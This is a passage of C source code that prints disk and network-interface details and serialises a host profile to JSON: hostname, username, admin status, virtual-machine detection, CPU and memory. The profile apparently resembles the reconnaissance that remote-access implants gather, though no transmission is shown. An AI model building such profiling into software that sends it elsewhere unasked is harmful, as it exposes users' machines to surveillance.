        printf("        Filesystem:  %s\n", disk->filesystem);
        printf("        Total:       %.2f GB\n", disk->total_space / (1024.0 * 1024.0 * 1024.0));
        printf("        Free:        %.2f GB\n", disk->free_space / (1024.0 * 1024.0 * 1024.0));
        printf("        Available:   %.2f GB\n", disk->available_space / (1024.0 * 1024.0 * 1024.0));
    }
    printf("\n");

    printf("[+] NETWORK INTERFACES (%d total)\n", info->nb_interfaces);
    for (int i = 0; i < info->nb_interfaces; i++) {
        const NetworkInterface* iface = &info->interfaces[i];
        printf("    [%d] %s\n", i, iface->name);
        printf("        IP:          %s\n", iface->ip_address);
        printf("        MAC:         %s\n", iface->mac_address);
        printf("        Status:      %s\n", iface->is_up ? "UP" : "DOWN");
    }
    printf("\n========================================\n");
}

// ============================================================================
// JSON SERIALIZATION
// ============================================================================
int system_info_to_json(const SystemInfo* info, char* buffer, size_t buffer_size) {
    if (!info || !buffer){
        printf("[ERROR] Invalid arguments to system_info_to_json\n");
        return -1;
    }

    int written = 0;
    int ret;

    #define SAFE_APPEND(...) do { \
        ret = snprintf(buffer + written, buffer_size - written, __VA_ARGS__); \
        if (ret < 0) { \
            printf("[ERROR] JSON serialization encoding error\n"); \
            return -1; \
        } \
        if (written + ret >= buffer_size) { \
            printf("[ERROR] JSON buffer overflow: need %d bytes, have %zu\n", written + ret, buffer_size); \
            return -1; \
        } \
        written += ret; \
    } while(0)

    SAFE_APPEND("{\n");
    SAFE_APPEND("  \"architecture\": \"%s\",\n", architecture_to_string(info->architecture));
    SAFE_APPEND("  \"os\": \"%s\",\n", os_to_string(info->os));
    SAFE_APPEND("  \"os_version\": \"%s\",\n", info->os_version);
    SAFE_APPEND("  \"hostname\": \"%s\",\n", info->hostname);
    SAFE_APPEND("  \"username\": \"%s\",\n", info->username);
    SAFE_APPEND("  \"is_admin\": %s,\n", info->is_admin ? "true" : "false");
    SAFE_APPEND("  \"is_vm\": %s,\n", info->is_vm ? "true" : "false");
    SAFE_APPEND("  \"cpu\": {\n");
    SAFE_APPEND("    \"model\": \"%s\",\n", info->cpu_model);
    SAFE_APPEND("    \"processors\": %d,\n", info->nb_processors);
    SAFE_APPEND("    \"logical_cores\": %d\n", info->nb_logical_cores);
    SAFE_APPEND("  },\n");
    SAFE_APPEND("  \"memory\": {\n");
    SAFE_APPEND("    \"total_mb\": %llu,\n", (unsigned long long)info->total_ram_mb);
    SAFE_APPEND("    \"used_mb\": %llu,\n", (unsigned long long)info->used_ram_mb);
    SAFE_APPEND("    \"available_mb\": %llu\n", (unsigned long long)info->available_ram_mb);
    SAFE_APPEND("  },\n");
    SAFE_APPEND("  \"nb_disks\": %d,\n", info->nb_disks);
    SAFE_APPEND("  \"nb_interfaces\": %d\n", info->nb_interfaces);
    SAFE_APPEND("}\n");

    #undef SAFE_APPEND

    printf("[DEBUG] JSON serialization written %d bytes\n", written);
    return 0;
}
